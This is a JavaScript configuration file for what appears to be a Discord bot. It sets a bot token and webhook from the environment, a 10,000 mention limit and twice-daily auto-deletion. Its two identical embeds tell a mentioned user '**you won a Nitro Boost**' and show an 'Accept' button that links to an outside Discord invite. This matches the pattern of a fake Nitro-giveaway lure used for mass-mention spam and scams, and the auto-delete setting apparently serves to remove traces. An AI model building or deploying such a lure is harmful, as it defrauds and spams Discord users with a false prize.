module.exports = {
    token: process.env.token,
    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,
    webhook:process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    embed: [
        {
            "content": "{user} **you won a Nitro Boost** ! https://i.postimg.cc/kGgQVXgd/niporta-png.png",
            "components": {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "label": "Accept",
                        "style": 5,
                        "emoji": {
                            "name": "Discord",
                            "id": "1243869797633232927",
                            "animated": true
                        },
                        "url": "https://discord.gg/MwRBgGGaam"
                    }
                ]
            }
        }
    ],

    embed2: [
        {
            "content": "{user} **you won a Nitro Boost** ! https://i.postimg.cc/kGgQVXgd/niporta-png.png",
            "components": {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "label": "Accept",
                        "style": 5,
                        "emoji": {
                            "name": "Discord",
                            "id": "1243869797633232927",
                            "animated": true
                        },
                        "url": "https://discord.gg/MwRBgGGaam"
                    }
                ]
            }
        }
    ]
}
